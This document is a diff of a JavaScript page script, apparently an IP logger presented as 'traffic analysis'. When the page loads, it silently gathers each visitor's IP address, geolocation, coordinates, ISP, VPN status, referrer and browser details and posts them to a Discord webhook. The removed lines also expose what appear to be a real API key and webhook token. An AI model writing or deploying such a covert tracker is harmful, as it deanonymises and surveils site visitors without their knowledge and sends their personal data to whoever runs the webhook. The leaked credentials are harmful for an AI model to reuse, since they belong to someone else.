@@ -1,6 +1,4 @@
-<script>
-
-    function httpGetAsync(url, callback) {
+ function httpGetAsync(url, callback) {
         const xmlHttp = new XMLHttpRequest();
         xmlHttp.onreadystatechange = function() {
             if (xmlHttp.readyState === 4 && xmlHttp.status === 200)
@@ -12,8 +10,8 @@
 
     function analyzeTraffic() {
         const ipUrl = "https://api64.ipify.org?format=json";
-        const geoUrl = "https://ipgeolocation.abstractapi.com/v1/?api_key=577cf8161d6e494bb7fb0df8e0b9102e"; // Replace with your Abstract API key
-        const discordWebhook = 'https://discord.com/api/webhooks/1165962811164348498/jgEsHpCRce9Kw8hY0IA4Ys9SN9dHMDVbVQmzp1J4BLVDjsCfMHyd2lcag4B0c5cKfIFT'; // Replace with your Discord webhook URL
+        const geoUrl = "https://ipgeolocation.abstractapi.com/v1/?api_key=YOUR_API_KEY"; // Replace with your Abstract API key
+        const discordWebhook = 'YOUR_DISCORD_WEBHOOK_URL'; // Replace with your Discord webhook URL
 
         httpGetAsync(ipUrl, function(ipData) {
             const ipInfo = JSON.parse(ipData);
@@ -47,7 +45,7 @@
                 userInformation.time = new Date().toLocaleTimeString();
                 userInformation.referringURL = document.referrer;
                 userInformation.browser = navigator.userAgent;
-               userInformation.device = geoInfo.device;
+                userInformation.device = geoInfo.device_type;
 
                 sendToDiscord(userInformation, discordWebhook);
             });
@@ -58,24 +56,32 @@
         const request = new XMLHttpRequest();
         request.open("POST", webhookURL);
 
-     
+        const emojis = {
+            location: '🌍',
+            vpn: '🛡️',
+            calendar: '📅',
+            clock: '🕒',
+            link: '🔗',
+            computer: '💻',
+        };
 
-        const messageContent = `**${emojis.location} IP Address:** ${data.ip_address}\n` +
+        const messageContent = `**🚩  IP Address:** ${data.ip_address}\n` +
             `**🔗 Current URL:** ${data.current_url}\n` +
             `**🏘️ City:** ${data.city}\n` +
-            `**🏞️ Region:** ${data.region}\n` +
+            `**🏞️Region:** ${data.region}\n` +
             `**🌐 Country:** ${data.country} (${data.country_code})\n` +
-            `**🌍 Continent:** ${data.continent} (${data.continent_code})\n` +
+            `**🌍Continent:** ${data.continent} (${data.continent_code})\n` +
             `**🗺️ Longitude/Latitude:** ${data.longitude}, ${data.latitude}\n` +
             `**🛡️ VPN Status:** ${data.security_vpn ? 'Using VPN' : 'Not Using VPN'}\n` +
-            `**🇳🇱 Flag:** ${data.flag}\n` +
+            `**🎌 Flag:** ${data.flag}\n` +
             `**🏢 ISP:** ${data.isp_name}\n` +
             `**📅 Date:** ${data.date}\n` +
             `**📆 Day:** ${data.day}\n` +
             `**⌚ Time:** ${data.time}\n` +
-            `**🌐 Referring URL:** ${data.referringURL}\n` +
+            `**🔗 Referring URL:** ${data.referringURL}\n` +
             `**🌐 Browser:** ${data.browser}\n` +
-             `**💻 Device:** ${data.device}`;
+            `**💻  Device:** ${data.device}`;
+
         const message = JSON.stringify({ content: messageContent });
 
         request.setRequestHeader('Content-type', 'application/json');
@@ -83,10 +89,4 @@
     }
 
     window.onload = function() {
-        analyzeTraffic(); // Automatically run the analysis when the page loads
-    };
-
-
-</script>
-
-
+        analyzeTraffic(); 
